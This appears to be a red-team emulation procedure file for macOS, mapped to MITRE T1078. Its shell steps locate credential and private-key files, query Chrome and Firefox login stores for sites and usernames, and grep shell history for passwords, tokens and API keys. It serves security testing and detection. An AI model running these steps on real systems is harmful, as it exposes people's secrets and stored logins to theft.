---
api_version: 2.0
uuid: 45d4b1f8-7c0e-6f61-2d5e-4a9b2c2f6e8d
name: Leaked Credentials Usage
authors:
- Claude Code
description: |
  Search for leaked or stored credentials on a macOS system. Scans common locations for
  credential files (.env, .pem, credentials), extracts stored credentials from browser
  databases, and searches shell history for password references.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1078 Valid Accounts
requirements:
  platforms:
  - os: darwin
args:
- name: search_path
  description: Base path to search for credential files
  type: string
  default: "~"
steps:
- name: search_credential_files
  description: Search for credential files in common locations
  inline: |
    echo "=== Searching for Credential Files Under '{{ .Args.search_path }}' ==="
    search_dir=$(eval echo {{ .Args.search_path }})
    echo "--- .env files ---"
    find "$search_dir" -maxdepth 5 -name "*.env" -type f 2>/dev/null | head -20
    echo "--- credentials files ---"
    find "$search_dir" -maxdepth 5 -name "credentials*" -type f 2>/dev/null | head -20
    echo "--- PEM key files ---"
    find "$search_dir" -maxdepth 5 -name "*.pem" -type f 2>/dev/null | head -20
    echo "--- SSH private keys ---"
    find "$search_dir/.ssh" -type f 2>/dev/null | while read -r f; do
      if head -1 "$f" 2>/dev/null | grep -q "PRIVATE KEY"; then
        echo "Private key found: $f"
      fi
    done
    echo "--- Other sensitive files ---"
    find "$search_dir" -maxdepth 5 \( -name ".netrc" -o -name ".pgpass" -o -name "*.p12" -o -name "*.pfx" -o -name "id_rsa" -o -name "id_ed25519" \) -type f 2>/dev/null | head -20
- name: extract_browser_credentials
  description: Locate and extract stored credentials from browser SQLite databases
  inline: |
    echo "=== Searching Browser Credential Stores ==="
    # Chrome Login Data
    chrome_login="$HOME/Library/Application Support/Google/Chrome/Default/Login Data"
    if [ -f "$chrome_login" ]; then
      echo "--- Chrome Login Data Found ---"
      cp "$chrome_login" /tmp/ttp_chrome_login.db
      sqlite3 /tmp/ttp_chrome_login.db "SELECT origin_url, username_value FROM logins WHERE username_value != '' LIMIT 20;" 2>/dev/null || echo "Could not query Chrome Login Data (may be locked)"
      rm -f /tmp/ttp_chrome_login.db
    else
      echo "Chrome Login Data not found"
    fi
    # Firefox logins
    ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
    if [ -d "$ff_profiles" ]; then
      echo "--- Firefox Credential Stores ---"
      find "$ff_profiles" -name "logins.json" -type f 2>/dev/null | while read -r f; do
        echo "Found Firefox logins: $f"
        python3 -c "import json; data=json.load(open('$f')); [print(l.get('hostname','')) for l in data.get('logins',[])]" 2>/dev/null | head -10 || echo "Could not parse Firefox logins"
      done
    else
      echo "Firefox profiles not found"
    fi
    # Safari - stored in Keychain, check for form data
    safari_dir="$HOME/Library/Safari"
    if [ -d "$safari_dir" ]; then
      echo "--- Safari Data Directory ---"
      ls -la "$safari_dir"/*.plist 2>/dev/null | head -10 || echo "No Safari plists accessible"
    fi
- name: search_shell_history
  description: Search bash and zsh history for password and credential references
  inline: |
    echo "=== Searching Shell History for Credential References ==="
    for histfile in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history"; do
      if [ -f "$histfile" ]; then
        echo "--- Searching $histfile ---"
        grep -in "password\|passwd\|token\|secret\|api_key\|apikey\|credentials\|auth" "$histfile" 2>/dev/null | tail -20
      fi
    done
    echo "--- Searching for inline credentials in history ---"
    for histfile in "$HOME/.bash_history" "$HOME/.zsh_history"; do
      if [ -f "$histfile" ]; then
        grep -in "curl.*-u \|curl.*--user\|mysql.*-p\|export.*KEY=\|export.*TOKEN=\|export.*SECRET=" "$histfile" 2>/dev/null | tail -20
      fi
    done
  cleanup:
    inline: |
      echo "Removing any temporary database copies"
      rm -f /tmp/ttp_chrome_login.db
tests:
- name: dry_run_test
  dry_run: true
